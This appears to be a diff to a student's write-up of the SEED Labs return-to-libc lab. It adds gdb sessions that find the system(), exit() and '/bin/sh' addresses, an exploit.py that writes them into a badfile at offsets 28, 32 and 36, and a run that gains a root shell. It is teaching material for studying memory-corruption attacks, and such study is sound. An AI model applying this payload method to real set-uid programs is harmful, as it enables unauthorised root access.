@@ -20,13 +20,15 @@ For general overview and the setup package for this lab, please go to [SEED Labs
 ```console
      Non-Executable Stack
 -----------------------------
-|                        _  |
+|                      <--  |
 | ...                    |  |
--------------------------|---          Executable Code Region
-| Return Address         |  |--------> -----------------------
--------------------------|---          |  system() function  |
-| Previous Frame Pointer |  |          -----------------------
 -------------------------|---
+|     String Argument    |  |
+-------------------------|--- <----- %ebp + 8       Executable Code Region
+|     Return Address     |  |---------------------> system() function
+-------------------------|---          
+| Previous Frame Pointer |  |          
+|------------------------|--| <----- %ebp
 | ...           Overflow |  |
 | ...           Buffer   |  |
 -----------------------------
@@ -219,5 +221,135 @@ $ ./prtenv
 ffffd838
 ```
 
+It should be noted that the address of the <code>MYSHELL<code> environment variable is sensitive to the length of the program name because the program name is pushed onto the stack before environment variables.
+
+```console
+$ mv prtenv ppprtenv
+$ ./ppprtenv
+ffffd834
+```
+
+We can use the following debugging method to print out the stack information:
+
+```console
+$ gcc -m32 -z noexecstack -g prtenv.c -o prtenv_dbg
+$ gdb -q prtenv_dbg
+...
+gdb-peda$ break main
+Breakpoint 1 at 0x11ed: file prtenv.c, line 1.
+gdb-peda$ run
+...
+gdb-peda$ x/32s *((char **)environ)
+0xffffd7e4:     "SHELL=/bin/bash"
+0xffffd7f4:     "MYSHELL=/bin/sh"
+0xffffd804:     "SUDO_GID=1000"
+0xffffd812:     "SUDO_COMMAND=/usr/bin/su seed"
+0xffffd830:     "SUDO_USER=ubuntu"
+0xffffd841:     "PWD=/home/seed/Documents/return2libc"
+0xffffd866:     "LOGNAME=seed"
+0xffffd873:     "_=/usr/bin/gdb"
+...
+0xffffdfcc:     "/home/seed/Documents/return2libc/prtenv_dbg"
+...
+```
+
+The program name is stored at address <code>0xffffdfcc</code>.
+
 ## Task 3: Launching the Attack
 
+In the return-to-libc attack, we need to place the argument (i.e., the address of the "<code>/bin/sh</code>" string) on the stack before the vulnerable function junps to the <code>system()</code> function by means of overflowing the target buffer.
+
+The <code>exploit.py</code> file is provided to help us create the content of <code>badfile</code>:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+X = 0
+sh_addr = 0x00000000        # The address of "/bin/sh"
+content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')
+
+Y = 0
+system_addr = 0x00000000    # The address of system()
+content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')
+
+Z = 0
+exit_addr = 0x00000000      # The address of exit()
+content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+  f.write(content)
+```
+
+To figure out the three addresses and the values for <code>X</code>, <code>Y</code>, and <code>Z</code>, we can debug the <code>retlib.c</code> program and calculate the distance between <code>%ebp</code> and <code>buffer</code> inside the function <code>bof</code>:
+
+```console
+$ gcc -m32 -fno-stack-protector -z noexecstack -g -o retlib_dbg retlib.c
+$ touch badfile
+$ gdb -q retlib_dbg
+...
+gdb-peda$ break bof
+Breakpoint 1 at 0x126d: file retlib.c, line 10.
+gdb-peda$ run
+...
+gdb-peda$ next
+...
+gdb-peda$ p $ebp
+$1 = (void *) 0xffffd1b8
+gdb-peda$ p &buffer
+$2 = (char (*)[12]) 0xffffd1a0
+gdb-peda$ p/d 0xffffd1b8 - 0xffffd1a0
+$3 = 24
+gdb-peda$ p &system
+$4 = (<text variable, no debug info> *) 0xf7e08420 <system>
+gdb-peda$ p &exit
+$5 = (<text variable, no debug info> *) 0xf7dfaf80 <exit>
+gdb-peda$ find /bin/sh
+Searching for '/bin/sh' in: None ranges
+Found 2 results, display max 2 items:
+   libc : 0xf7f52352 ("/bin/sh")
+[stack] : 0xffffd7fc ("/bin/sh")
+gdb-peda$ quit
+```
+
+The distance between <code>%ebp</code> and <code>buffer</code> is <code>24</code> bytes. Once we enter the <code>system()</code> function, the value of <code>%ebp</code> has gained four bytes. Therefore:
+
+```python
+Y = 24 + 4 = 28
+system_addr = 0xf7e08420
+
+Z = 24 + 8 = 32
+exit_addr = 0xf7dfaf80
+
+X = 24 + 12 = 36</code>
+sh_addr = 0xf7f52352
+```
+
+Sucessfully obtained the root shell:
+
+```console
+$ vim task3.py
+$ sudo chown root task3.py
+$ sudo chmod 777 task3.py
+$ ./task3.py
+$ ./retlib
+Address of /bin/bash: ffffd838
+Address of input[] inside main():  0xffffd238
+Input size: 300
+Address of buffer[] inside bof():  0xffffd200
+Frame Pointer value inside bof():  0xffffd218
+# whoami
+root
+```
+
+## Task 4: Defeat Shell's Countermeasure
+
+In this task, we would like to defeat the countermeasure that automatically drops privileges when they are executed in a <code>Set-UID</code> process. Let us first change the symbolic link back:
+
+```console
+$ sudo ln -sf /bin/dash /bin/sh
+```
